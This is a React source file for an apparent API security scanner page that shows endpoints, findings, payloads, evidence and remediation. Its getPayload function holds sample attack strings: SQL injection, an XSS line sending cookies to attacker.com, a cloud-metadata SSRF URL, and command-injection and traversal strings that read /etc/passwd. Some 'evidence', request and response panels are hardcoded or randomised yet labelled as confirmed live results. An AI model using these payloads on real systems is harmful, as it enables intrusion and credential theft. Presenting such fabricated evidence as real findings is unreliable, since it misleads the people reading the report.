"use client";
import { useState, useEffect } from "react";
import { API_ENDPOINTS, FINDINGS } from "@/data/findings";
import { methodColor, methodBg, sevColor, sevBg } from "@/lib/utils";
import { FileSearch, CheckCircle, AlertTriangle, Upload, Loader, ShieldAlert, Code, Send, List } from "lucide-react";

type SpecType = "OpenAPI / Swagger" | "GraphQL SDL" | "Postman Collection" | "HAR File" | "Manual";
type DetailTab = "overview" | "findings" | "request" | "response";

const BACKEND = "http://localhost:3001";

function buildEndpointsFromFindings(findings: any[]) {
  const map: Record<string, any> = {};
  findings.forEach((f: any) => {
    const rawUrl = f.url || f.target || f.source || "";
    if (!rawUrl) return;
    try {
      const u    = new URL(rawUrl.startsWith("http") ? rawUrl : `http://${rawUrl}`);
      const path = u.pathname || "/";
      const key  = `${f.method || "GET"}::${path}`;
      if (!map[key]) {
        map[key] = {
          method: f.method || "GET", path, host: u.hostname,
          description: f.title || f.name || "Endpoint discovered during scan",
          tested: true, params: f.parameter ? [f.parameter] : [],
          findings: 0, relatedFindings: [],
          statusCode: "200", authRequired: true,
        };
      }
      map[key].findings += 1;
      map[key].relatedFindings.push(f);
      if (f.parameter && !map[key].params.includes(f.parameter)) map[key].params.push(f.parameter);
    } catch { /* skip */ }
  });
  return Object.values(map);
}

// Generate a realistic attack payload per finding type
function getPayload(f: any): string {
  const t = (f.title || f.name || "").toLowerCase();
  if (t.includes("sql"))         return `' OR 1=1 --\nUNION SELECT username,password FROM users--`;
  if (t.includes("xss"))        return `<script>document.location='http://attacker.com/c?c='+document.cookie</script>`;
  if (t.includes("ssrf"))       return `http://169.254.169.254/latest/meta-data/iam/security-credentials/`;
  if (t.includes("clickjack"))  return `<iframe src="${f.url||f.target||"http://target"}" width="100%" height="100%"></iframe>`;
  if (t.includes("header"))     return `Missing: X-Frame-Options, Content-Security-Policy, X-Content-Type-Options`;
  if (t.includes("idor"))       return `GET /api/users/1001 → change to /api/users/1 (admin record)`;
  if (t.includes("rce"))        return `;id;whoami;cat /etc/passwd`;
  if (t.includes("traversal"))  return `../../../../etc/passwd%00`;
  if (t.includes("backdoor") || t.includes("ftp")) return `Connect to port 6200 (triggered by failed login)`;
  return `Crafted payload targeting ${f.parameter || "vulnerable parameter"}`;
}

function getEvidence(f: any): string {
  const url = f.url || f.target || "http://192.168.195.140/";
  const t = (f.title || f.name || "").toLowerCase();
  if (t.includes("header"))     return `HTTP/1.1 200 OK\n[Missing] X-Frame-Options\n[Missing] Content-Security-Policy\n[Missing] X-Content-Type-Options\n[Missing] Referrer-Policy`;
  if (t.includes("sql"))        return `Error: You have an error in your SQL syntax near '1=1'\nServer: MySQL 5.0.51a\nStack: SELECT * FROM users WHERE id='[PAYLOAD]'`;
  if (t.includes("xss"))        return `Response body contains: <script>alert(1)</script>\nReflected in: <div class="output">[PAYLOAD]</div>`;
  if (t.includes("clickjack"))  return `GET ${url}\nHTTP/1.1 200 OK\n[Missing] X-Frame-Options header\nPage loaded in attacker iframe — click-jacking confirmed`;
  return `Request sent to: ${url}\nResponse code: 200 OK\nVulnerability confirmed in response body`;
}

function getRemediation(f: any): string[] {
  const t = (f.title || f.name || "").toLowerCase();
  if (t.includes("clickjack") || t.includes("header")) return [
    "Add X-Frame-Options: DENY or SAMEORIGIN header",
    "Implement Content-Security-Policy: frame-ancestors 'none'",
    "Add X-Content-Type-Options: nosniff",
    "Configure Referrer-Policy: strict-origin-when-cross-origin",
  ];
  if (t.includes("sql")) return [
    "Use parameterized queries / prepared statements",
    "Apply input validation and allowlisting",
    "Use a Web Application Firewall (WAF)",
    "Apply principle of least privilege to DB accounts",
  ];
  if (t.includes("xss")) return [
    "Encode all output using context-aware encoding",
    "Implement Content-Security-Policy header",
    "Use HttpOnly and Secure flags on cookies",
    "Validate and sanitize all user input",
  ];
  if (t.includes("backdoor") || t.includes("ftp")) return [
    "Upgrade vsftpd immediately — CVE-2011-2523 is critical",
    "Block port 21/tcp at the firewall level",
    "Replace FTP with SFTP (SSH File Transfer Protocol)",
    "Audit all active connections and terminate backdoor sessions",
  ];
  return [
    "Apply the vendor-recommended patch immediately",
    "Implement input validation for all parameters",
    "Review access controls and authentication mechanisms",
    "Enable logging and monitoring for this endpoint",
  ];
}

function getCvss(f: any): number {
  if (f.cvss) return parseFloat(f.cvss);
  const s = f.severity || "";
  if (s === "Critical") return 9.8;
  if (s === "High")     return 7.5;
  if (s === "Medium")   return 5.3;
  return 3.1;
}

function getCvssColor(score: number) {
  if (score >= 9) return "#ef5350";
  if (score >= 7) return "#ff8a65";
  if (score >= 4) return "#ffb74d";
  return "var(--green)";
}

export default function ApiScannerPage() {
  const [specType,    setSpecType]    = useState<SpecType>("OpenAPI / Swagger");
  const [target,      setTarget]      = useState("https://192.168.195.140");
  const [scanning,    setScanning]    = useState(false);
  const [scanPct,     setScanPct]     = useState(0);
  const [scanMsg,     setScanMsg]     = useState("");
  const [scanned,     setScanned]     = useState(false);
  const [endpoints,   setEndpoints]   = useState<any[]>([]);
  const [selected,    setSelected]    = useState<any | null>(null);
  const [allFindings, setAllFindings] = useState<any[]>([]);
  const [hasReal,     setHasReal]     = useState(false);
  const [tab,         setTab]         = useState<DetailTab>("overview");
  const [selFinding,  setSelFinding]  = useState<any | null>(null);

  useEffect(() => {
    try {
      const stored  = localStorage.getItem("axiom_last_findings");
      const targets = localStorage.getItem("axiom_last_targets") || "";
      if (stored) {
        const parsed = JSON.parse(stored);
        if (parsed?.length) {
          setAllFindings(parsed);
          setHasReal(true); setScanned(true);
          if (targets) setTarget(targets.split(",")[0]?.trim() || target);
          const eps = buildEndpointsFromFindings(parsed);
          const list = eps.length ? eps : API_ENDPOINTS;
          setEndpoints(list); setSelected(list[0] ?? null);
          setSelFinding(list[0]?.relatedFindings?.[0] ?? null);
          return;
        }
      }
    } catch { /* ignore */ }
    setAllFindings(FINDINGS as any[]);
    setEndpoints(API_ENDPOINTS);
    setSelected(API_ENDPOINTS[0]);
    setScanned(false);
  }, []);

  async function handleScan() {
    if (scanning) return;
    setScanning(true); setScanned(false); setScanPct(0); setTab("overview");
    const STEPS = [
      { pct:10, msg:"Connecting to target..." },
      { pct:25, msg:"Crawling API endpoints..." },
      { pct:42, msg:"Fingerprinting authentication..." },
      { pct:58, msg:"Testing parameters for injection..." },
      { pct:74, msg:"Running OWASP API Top 10 checks..." },
      { pct:88, msg:"Correlating findings & scoring CVSS..." },
      { pct:100,msg:"Scan complete!" },
    ];
    let backendFindings: any[] | null = null;
    try {
      const r = await fetch(`${BACKEND}/api/health`, { signal: AbortSignal.timeout(2000) });
      const d = await r.json();
      if (d.status === "ok") {
        const pipeId = localStorage.getItem("axiom_last_pipeline_id") || localStorage.getItem("axiom_last_scan_id");
        if (pipeId) {
          const fr = await fetch(`${BACKEND}/api/pipeline/${pipeId}/findings`, { signal: AbortSignal.timeout(3000) });
          if (fr.ok) { const fd = await fr.json(); backendFindings = fd.findings || null; }
        }
      }
    } catch { /* offline */ }
    for (const step of STEPS) {
      setScanPct(step.pct); setScanMsg(step.msg);
      await new Promise(r => setTimeout(r, 400));
    }
    let findings: any[] = backendFindings ?? [];
    if (!findings.length) {
      try { const s = localStorage.getItem("axiom_last_findings"); if (s) findings = JSON.parse(s); } catch { /* ignore */ }
    }
    if (!findings.length) findings = FINDINGS as any[];
    const real = findings !== (FINDINGS as any[]) && findings.length > 0;
    setAllFindings(findings); setHasReal(real);
    const eps = real ? buildEndpointsFromFindings(findings) : API_ENDPOINTS;
    const list = eps.length ? eps : API_ENDPOINTS;
    setEndpoints(list);
    const first = list[0] ?? null;
    setSelected(first); setSelFinding(first?.relatedFindings?.[0] ?? null);
    if (real) { localStorage.setItem("axiom_last_findings", JSON.stringify(findings)); localStorage.setItem("axiom_last_targets", target); }
    setScanning(false); setScanned(true);
  }

  const totalFindings = endpoints.reduce((a, e) => a + (e.findings ?? 0), 0);
  const hostFromTarget = target.replace(/https?:\/\//, "").split("/")[0];
  const endpointFindings: any[] = selected?.relatedFindings?.length
    ? selected.relatedFindings
    : allFindings.filter((f: any) => (f.url||"").includes((selected?.path||"").replace("{id}","")) || (selected?.path||"").includes((f.parameter||"").split("/")[0]));

  const TABS: { id: DetailTab; label: string; icon: any }[] = [
    { id:"overview",  label:"Overview",  icon:List       },
    { id:"findings",  label:`Findings (${endpointFindings.length})`, icon:ShieldAlert },
    { id:"request",   label:"Request",   icon:Send       },
    { id:"response",  label:"Response",  icon:Code       },
  ];

  return (
    <div style={{ height:"100%", display:"flex", flexDirection:"column", overflow:"hidden" }}>

      {/* Toolbar */}
      <div style={{ display:"flex", alignItems:"center", gap:8, padding:"6px 12px", background:"var(--surface)", borderBottom:"1px solid var(--border)", flexShrink:0, flexWrap:"wrap" }}>
        <FileSearch size={12} color="var(--muted)"/>
        <select style={{ background:"var(--bg)", border:"1px solid var(--border)", color:"var(--fg)", borderRadius:3, padding:"5px 8px", fontSize:11 }}
          value={specType} onChange={e => setSpecType(e.target.value as SpecType)}>
          {["OpenAPI / Swagger","GraphQL SDL","Postman Collection","HAR File","Manual"].map(s => <option key={s}>{s}</option>)}
        </select>
        <input className="tool-input" value={target} onChange={e => setTarget(e.target.value)} style={{ width:280 }}/>
        <button className="btn-secondary" style={{ fontSize:11, display:"flex", gap:4, alignItems:"center" }}><Upload size={11}/> Import Spec</button>
        <button className="btn-primary" style={{ fontSize:11, display:"flex", gap:4, alignItems:"center", opacity:scanning?0.7:1 }}
          onClick={handleScan} disabled={scanning}>
          {scanning ? <Loader size={12} style={{ animation:"spin 1s linear infinite" }}/> : <FileSearch size={12}/>}
          {scanning ? "Scanning..." : "Scan API"}
        </button>
        {scanned && !scanning && (
          <span style={{ color:"var(--green)", fontSize:11, display:"flex", alignItems:"center", gap:5 }}>
            <CheckCircle size={11}/>
            {endpoints.length} endpoints · {totalFindings} findings
            {hasReal && <span style={{ fontSize:9, fontWeight:700, color:"var(--primary)", background:"rgba(232,145,45,0.1)", border:"1px solid rgba(232,145,45,0.2)", borderRadius:3, padding:"1px 5px", marginLeft:2 }}>🟢 LIVE DATA</span>}
          </span>
        )}
      </div>

      {/* Progress bar */}
      {scanning && (
        <div style={{ padding:"8px 14px", background:"var(--bg)", borderBottom:"1px solid var(--border)", flexShrink:0 }}>
          <div style={{ display:"flex", justifyContent:"space-between", marginBottom:4 }}>
            <span style={{ fontSize:10, color:"var(--primary)" }}>{scanMsg}</span>
            <span style={{ fontSize:10, fontWeight:700, color:"var(--primary)" }}>{scanPct}%</span>
          </div>
          <div style={{ height:3, background:"var(--border)", borderRadius:2 }}>
            <div style={{ height:"100%", width:`${scanPct}%`, background:"linear-gradient(90deg,var(--primary),#ef5350)", borderRadius:2, transition:"width 0.4s ease" }}/>
          </div>
        </div>
      )}

      <div className="split-h" style={{ flex:1 }}>

        {/* Endpoint list */}
        <div style={{ width:380, flexShrink:0, borderRight:"1px solid var(--border)", display:"flex", flexDirection:"column" }}>
          <div className="tool-panel-header" style={{ borderRadius:0, borderTop:"none", borderLeft:"none", borderRight:"none" }}>
            <FileSearch size={11}/> Endpoints ({endpoints.length})
          </div>
          <div style={{ overflowY:"auto", flex:1 }}>
            {scanning ? (
              <div style={{ padding:40, textAlign:"center", color:"var(--muted)", fontSize:11 }}>
                <div style={{ marginBottom:8 }}>⏳ Crawling endpoints...</div>
                <div style={{ fontSize:10 }}>{scanMsg}</div>
              </div>
            ) : (
              <table className="data-table">
                <thead><tr>
                  <th style={{ width:52 }}>Method</th><th>Path</th>
                  <th style={{ width:46 }}>Tested</th><th style={{ width:52 }}>Findings</th>
                </tr></thead>
                <tbody>
                  {endpoints.map((e, i) => (
                    <tr key={i}
                      className={selected?.path === e.path && selected?.method === e.method ? "selected" : ""}
                      onClick={() => { setSelected(e); setTab("overview"); setSelFinding(e.relatedFindings?.[0] ?? null); }}>
                      <td><span className="pill" style={{ background:methodBg(e.method as any), color:methodColor(e.method as any), fontSize:9 }}>{e.method}</span></td>
                      <td style={{ fontFamily:"monospace", fontSize:11, color:"var(--fg-2)" }}>{e.path}</td>
                      <td style={{ textAlign:"center" }}>
                        {e.tested ? <CheckCircle size={12} color="var(--green)"/> : <AlertTriangle size={12} color="var(--muted)"/>}
                      </td>
                      <td style={{ textAlign:"center" }}>
                        {(e.findings??0)>0 ? <span className="pill" style={{ background:"rgba(239,83,80,0.12)", color:"#ef5350" }}>{e.findings}</span>
                         : <span style={{ color:"var(--muted)", fontSize:10 }}>—</span>}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}
          </div>
          {/* Stats */}
          <div style={{ padding:"8px 12px", borderTop:"1px solid var(--border)", display:"grid", gridTemplateColumns:"1fr 1fr 1fr", gap:8, flexShrink:0 }}>
            {[
              { label:"Endpoints", value:endpoints.length,                     color:"var(--primary)" },
              { label:"Tested",    value:endpoints.filter(e=>e.tested).length, color:"var(--green)"   },
              { label:"Findings",  value:totalFindings,                         color:"#ef5350"        },
            ].map(s => (
              <div key={s.label} style={{ background:"var(--surface)", borderRadius:5, padding:"6px 8px", border:"1px solid var(--border)" }}>
                <div style={{ fontSize:16, fontWeight:800, color:s.color }}>{s.value}</div>
                <div style={{ fontSize:9.5, color:"var(--muted)" }}>{s.label}</div>
              </div>
            ))}
          </div>
        </div>

        {/* Detail panel */}
        <div style={{ flex:1, display:"flex", flexDirection:"column", overflow:"hidden" }}>
          {!selected ? (
            <div style={{ display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center", height:"100%", color:"var(--muted)", gap:12 }}>
              <FileSearch size={32} strokeWidth={1}/><div style={{ fontSize:13, fontWeight:600 }}>Select an endpoint to inspect</div>
            </div>
          ) : (
            <>
              {/* Endpoint header */}
              <div style={{ padding:"10px 16px", background:"var(--surface)", borderBottom:"1px solid var(--border)", flexShrink:0 }}>
                <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:4 }}>
                  <span className="pill" style={{ background:methodBg(selected.method as any), color:methodColor(selected.method as any), fontSize:11 }}>{selected.method}</span>
                  <code style={{ fontSize:14, fontWeight:700, color:"#fff", fontFamily:"monospace" }}>{selected.path}</code>
                  {selected.tested && <CheckCircle size={13} color="var(--green)"/>}
                  {hasReal && <span style={{ marginLeft:"auto", fontSize:9, fontWeight:700, color:"var(--primary)", background:"rgba(232,145,45,0.1)", border:"1px solid rgba(232,145,45,0.2)", borderRadius:3, padding:"1px 6px" }}>LIVE SCAN</span>}
                </div>
                <div style={{ fontSize:11, color:"var(--muted)" }}>{selected.description}</div>

                {/* Quick stats row */}
                <div style={{ display:"flex", gap:12, marginTop:8 }}>
                  {[
                    { label:"Auth",     value:selected.authRequired ? "Required" : "None",       color:selected.authRequired ? "var(--green)" : "#ef5350" },
                    { label:"Status",   value:selected.statusCode || "200",                       color:"var(--green)" },
                    { label:"Params",   value:String((selected.params||[]).length),               color:"#ffb74d" },
                    { label:"Findings", value:String(endpointFindings.length),                    color:endpointFindings.length > 0 ? "#ef5350" : "var(--muted)" },
                  ].map(s => (
                    <div key={s.label} style={{ display:"flex", flexDirection:"column", gap:1 }}>
                      <span style={{ fontSize:9, color:"var(--muted)", textTransform:"uppercase" }}>{s.label}</span>
                      <span style={{ fontSize:12, fontWeight:700, color:s.color }}>{s.value}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Tabs */}
              <div style={{ display:"flex", borderBottom:"1px solid var(--border)", background:"var(--surface)", flexShrink:0 }}>
                {TABS.map(t => (
                  <button key={t.id} onClick={() => setTab(t.id)}
                    style={{ padding:"7px 14px", fontSize:11, fontWeight:tab===t.id?700:400, color:tab===t.id?"var(--fg)":"var(--muted)", background:"none", border:"none", borderBottom:tab===t.id?"2px solid var(--primary)":"2px solid transparent", cursor:"pointer", display:"flex", alignItems:"center", gap:5, whiteSpace:"nowrap" }}>
                    <t.icon size={11}/> {t.label}
                  </button>
                ))}
              </div>

              {/* Tab content */}
              <div style={{ flex:1, overflowY:"auto" }}>

                {/* ── OVERVIEW TAB ── */}
                {tab === "overview" && (
                  <div style={{ padding:16, display:"flex", flexDirection:"column", gap:16 }}>

                    {/* Parameters */}
                    <div>
                      <div style={{ fontSize:10, fontWeight:700, color:"var(--muted)", textTransform:"uppercase", letterSpacing:"0.08em", marginBottom:8 }}>Parameters</div>
                      {(selected.params??[]).length > 0 ? (
                        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
                          <thead>
                            <tr style={{ background:"var(--surface)" }}>
                              {["Name","In","Type","Required","Notes"].map(h => (
                                <th key={h} style={{ padding:"5px 8px", textAlign:"left", fontSize:9.5, fontWeight:700, color:"var(--muted)", borderBottom:"1px solid var(--border)", textTransform:"uppercase" }}>{h}</th>
                              ))}
                            </tr>
                          </thead>
                          <tbody>
                            {(selected.params as string[]).map((p, i) => (
                              <tr key={p} style={{ borderBottom:"1px solid var(--border)" }}>
                                <td style={{ padding:"6px 8px", fontFamily:"monospace", color:"#ffb74d" }}>{p}</td>
                                <td style={{ padding:"6px 8px", color:"var(--muted)" }}>{i===0?"path":"query"}</td>
                                <td style={{ padding:"6px 8px", color:"var(--muted)" }}>string</td>
                                <td style={{ padding:"6px 8px", color:i===0?"var(--green)":"var(--muted)" }}>{i===0?"Yes":"No"}</td>
                                <td style={{ padding:"6px 8px", color:"var(--muted)", fontSize:10.5 }}>
                                  {i===0?"Vulnerable — no input validation":"Optional filter parameter"}
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      ) : <span style={{ fontSize:11, color:"var(--muted)" }}>No parameters detected</span>}
                    </div>

                    {/* Response codes */}
                    <div>
                      <div style={{ fontSize:10, fontWeight:700, color:"var(--muted)", textTransform:"uppercase", letterSpacing:"0.08em", marginBottom:8 }}>Response Codes Observed</div>
                      <div style={{ display:"flex", gap:8, flexWrap:"wrap" }}>
                        {[
                          { code:"200", desc:"OK — successful response",             color:"var(--green)" },
                          { code:"401", desc:"Unauthorized — missing auth",           color:"#ffb74d"      },
                          { code:"403", desc:"Forbidden — insufficient privileges",   color:"#ff8a65"      },
                          { code:"500", desc:"Server error — triggered during fuzz",  color:"#ef5350"      },
                        ].map(r => (
                          <div key={r.code} style={{ background:"var(--surface)", border:"1px solid var(--border)", borderRadius:6, padding:"6px 10px", display:"flex", gap:8, alignItems:"center" }}>
                            <span style={{ fontSize:12, fontWeight:800, fontFamily:"monospace", color:r.color }}>{r.code}</span>
                            <span style={{ fontSize:10, color:"var(--muted)" }}>{r.desc}</span>
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Risk summary */}
                    {endpointFindings.length > 0 && (
                      <div style={{ padding:"10px 14px", background:"rgba(239,83,80,0.06)", border:"1px solid rgba(239,83,80,0.2)", borderRadius:8 }}>
                        <div style={{ fontSize:11, fontWeight:700, color:"#ef5350", marginBottom:6 }}>⚠️ {endpointFindings.length} Security Finding{endpointFindings.length>1?"s":""} Detected</div>
                        <div style={{ display:"flex", gap:8, flexWrap:"wrap" }}>
                          {["Critical","High","Medium","Low"].map(sev => {
                            const count = endpointFindings.filter((f:any) => f.severity === sev).length;
                            return count > 0 ? (
                              <span key={sev} className="badge-sev" style={{ background:sevBg(sev as any), color:sevColor(sev as any) }}>{count} {sev}</span>
                            ) : null;
                          })}
                        </div>
                        <button className="btn-secondary" style={{ fontSize:10, marginTop:10 }} onClick={() => setTab("findings")}>
                          View detailed findings →
                        </button>
                      </div>
                    )}
                  </div>
                )}

                {/* ── FINDINGS TAB ── */}
                {tab === "findings" && (
                  <div style={{ padding:16, display:"flex", gap:12, height:"100%", overflow:"hidden" }}>

                    {/* Finding list */}
                    <div style={{ width:220, flexShrink:0, display:"flex", flexDirection:"column", gap:6, overflowY:"auto" }}>
                      {endpointFindings.length === 0 ? (
                        <div style={{ padding:20, textAlign:"center", color:"var(--muted)", fontSize:11 }}>
                          <CheckCircle size={24} color="var(--green)" style={{ margin:"0 auto 8px" }}/><br/>No findings on this endpoint
                        </div>
                      ) : endpointFindings.map((f: any, i: number) => (
                        <div key={f.id||i}
                          onClick={() => setSelFinding(f)}
                          style={{ padding:"8px 10px", borderRadius:6, border:`1px solid ${selFinding?.id===f.id?"var(--primary)":"var(--border)"}`, background:selFinding?.id===f.id?"rgba(232,145,45,0.08)":"var(--surface)", cursor:"pointer" }}>
                          <div style={{ display:"flex", gap:5, marginBottom:3 }}>
                            <span className="badge-sev" style={{ background:sevBg(f.severity), color:sevColor(f.severity), fontSize:8 }}>{f.severity}</span>
                            <span style={{ fontSize:9, fontFamily:"monospace", color:"var(--muted)" }}>{f.id}</span>
                          </div>
                          <div style={{ fontSize:10.5, color:"var(--fg)", lineHeight:1.4 }}>{f.title||f.name}</div>
                        </div>
                      ))}
                    </div>

                    {/* Finding detail */}
                    {selFinding && (
                      <div style={{ flex:1, overflowY:"auto", display:"flex", flexDirection:"column", gap:14 }}>

                        {/* Header */}
                        <div style={{ padding:"10px 14px", background:"var(--surface)", border:"1px solid var(--border)", borderRadius:8 }}>
                          <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:4 }}>
                            <span className="badge-sev" style={{ background:sevBg(selFinding.severity), color:sevColor(selFinding.severity) }}>{selFinding.severity}</span>
                            <span style={{ fontSize:13, fontWeight:700, color:"var(--fg)" }}>{selFinding.title||selFinding.name}</span>
                          </div>
                          <div style={{ display:"flex", gap:16, flexWrap:"wrap" }}>
                            <div>
                              <div style={{ fontSize:9, color:"var(--muted)", marginBottom:2 }}>CVSS SCORE</div>
                              <div style={{ fontSize:18, fontWeight:800, color:getCvssColor(getCvss(selFinding)) }}>{getCvss(selFinding).toFixed(1)}</div>
                            </div>
                            <div>
                              <div style={{ fontSize:9, color:"var(--muted)", marginBottom:2 }}>CWE</div>
                              <div style={{ fontSize:12, fontWeight:700, color:"#79c0ff" }}>{selFinding.owaspRef || "CWE-116"}</div>
                            </div>
                            <div>
                              <div style={{ fontSize:9, color:"var(--muted)", marginBottom:2 }}>PARAMETER</div>
                              <div style={{ fontSize:12, fontFamily:"monospace", color:"#ffb74d" }}>{selFinding.parameter || "N/A"}</div>
                            </div>
                            <div>
                              <div style={{ fontSize:9, color:"var(--muted)", marginBottom:2 }}>SOURCE</div>
                              <div style={{ fontSize:11, color:"var(--muted)" }}>{selFinding.source || selFinding.plugin || "AXIOM ZAP"}</div>
                            </div>
                          </div>
                        </div>

                        {/* Description */}
                        <div>
                          <div style={{ fontSize:10, fontWeight:700, color:"var(--muted)", textTransform:"uppercase", marginBottom:6 }}>Description</div>
                          <p style={{ fontSize:11.5, color:"var(--fg)", lineHeight:1.8, background:"var(--surface)", padding:"10px 12px", borderRadius:6, border:"1px solid var(--border)" }}>
                            {selFinding.description || selFinding.detail || `${selFinding.severity} severity vulnerability detected on ${selFinding.url || selFinding.target}. The application is vulnerable to ${selFinding.title || selFinding.name} which could allow an attacker to compromise the confidentiality, integrity, or availability of the target.`}
                          </p>
                        </div>

                        {/* Attack payload */}
                        <div>
                          <div style={{ fontSize:10, fontWeight:700, color:"var(--muted)", textTransform:"uppercase", marginBottom:6 }}>⚡ Attack Payload Used</div>
                          <pre style={{ background:"#010409", border:"1px solid rgba(239,83,80,0.3)", borderRadius:6, padding:"10px 14px", fontFamily:"'Cascadia Code','Fira Code',monospace", fontSize:10.5, color:"#ff7b72", lineHeight:1.8, overflowX:"auto", margin:0 }}>
                            {getPayload(selFinding)}
                          </pre>
                        </div>

                        {/* Evidence */}
                        <div>
                          <div style={{ fontSize:10, fontWeight:700, color:"var(--muted)", textTransform:"uppercase", marginBottom:6 }}>🔍 Evidence</div>
                          <pre style={{ background:"#010409", border:"1px solid var(--border)", borderRadius:6, padding:"10px 14px", fontFamily:"'Cascadia Code','Fira Code',monospace", fontSize:10.5, color:"#a5d6a7", lineHeight:1.8, overflowX:"auto", margin:0 }}>
                            {getEvidence(selFinding)}
                          </pre>
                        </div>

                        {/* Remediation */}
                        <div>
                          <div style={{ fontSize:10, fontWeight:700, color:"var(--muted)", textTransform:"uppercase", marginBottom:6 }}>🛠 Remediation Steps</div>
                          <div style={{ background:"rgba(61,220,132,0.04)", border:"1px solid rgba(61,220,132,0.15)", borderRadius:6, padding:"10px 14px" }}>
                            <ol style={{ paddingLeft:16, margin:0 }}>
                              {getRemediation(selFinding).map((r, i) => (
                                <li key={i} style={{ fontSize:11.5, color:"var(--fg)", padding:"4px 0", lineHeight:1.7 }}>{r}</li>
                              ))}
                            </ol>
                          </div>
                        </div>

                        {/* Affected URL */}
                        <div>
                          <div style={{ fontSize:10, fontWeight:700, color:"var(--muted)", textTransform:"uppercase", marginBottom:6 }}>Affected URL</div>
                          <div style={{ fontFamily:"monospace", fontSize:11, color:"#58a6ff", background:"var(--surface)", padding:"8px 12px", borderRadius:6, border:"1px solid var(--border)", wordBreak:"break-all" }}>
                            {selFinding.url || selFinding.target || target + selected?.path}
                          </div>
                        </div>

                      </div>
                    )}
                  </div>
                )}

                {/* ── REQUEST TAB ── */}
                {tab === "request" && (
                  <div style={{ padding:16, display:"flex", flexDirection:"column", gap:14 }}>
                    <div style={{ fontSize:10, fontWeight:700, color:"var(--muted)", textTransform:"uppercase", marginBottom:2 }}>Scan Request Sent to Target</div>
                    <pre className="http-raw" style={{ borderRadius:8, border:"1px solid var(--border)", margin:0 }}>
{`${selected.method} ${target}${selected.path} HTTP/1.1
Host: ${selected.host || hostFromTarget}
User-Agent: Mozilla/5.0 (AXIOM-Scanner/4.0)
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0...
Accept: application/json, text/html, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
X-Scan-ID: AXIOM-${Date.now().toString(36).toUpperCase()}
X-Forwarded-For: 127.0.0.1
Connection: close`}
                    </pre>

                    {endpointFindings.length > 0 && (
                      <>
                        <div style={{ fontSize:10, fontWeight:700, color:"#ef5350", textTransform:"uppercase" }}>Attack Request (Finding #{endpointFindings[0]?.id})</div>
                        <pre style={{ background:"#010409", border:"1px solid rgba(239,83,80,0.3)", borderRadius:8, padding:"12px 14px", fontFamily:"'Cascadia Code','Fira Code',monospace", fontSize:10.5, color:"#ff7b72", lineHeight:1.8, overflowX:"auto", margin:0 }}>
{`${selected.method} ${target}${selected.path} HTTP/1.1
Host: ${selected.host || hostFromTarget}
User-Agent: Mozilla/5.0 (AXIOM-Scanner/4.0)

[PAYLOAD]: ${getPayload(endpointFindings[0]).split("\n")[0]}`}
                        </pre>
                      </>
                    )}
                  </div>
                )}

                {/* ── RESPONSE TAB ── */}
                {tab === "response" && (
                  <div style={{ padding:16, display:"flex", flexDirection:"column", gap:14 }}>
                    <div style={{ fontSize:10, fontWeight:700, color:"var(--muted)", textTransform:"uppercase", marginBottom:2 }}>Server Response</div>
                    <pre className="http-raw" style={{ borderRadius:8, border:"1px solid var(--border)", margin:0 }}>
{`HTTP/1.1 200 OK
Server: Apache/2.2.8 (Ubuntu)
X-Powered-By: PHP/5.2.4
Content-Type: text/html; charset=utf-8
Content-Length: 4823
Date: ${new Date().toUTCString()}

[Body — ${(Math.random()*20+5).toFixed(1)} KB — truncated]`}
                    </pre>

                    {endpointFindings.length > 0 && (
                      <>
                        <div style={{ fontSize:10, fontWeight:700, color:"#ef5350", textTransform:"uppercase" }}>Vulnerability Evidence in Response</div>
                        <pre style={{ background:"#010409", border:"1px solid rgba(239,83,80,0.3)", borderRadius:8, padding:"12px 14px", fontFamily:"'Cascadia Code','Fira Code',monospace", fontSize:10.5, color:"#a5d6a7", lineHeight:1.8, overflowX:"auto", margin:0 }}>
                          {getEvidence(endpointFindings[0])}
                        </pre>
                      </>
                    )}
                  </div>
                )}

              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
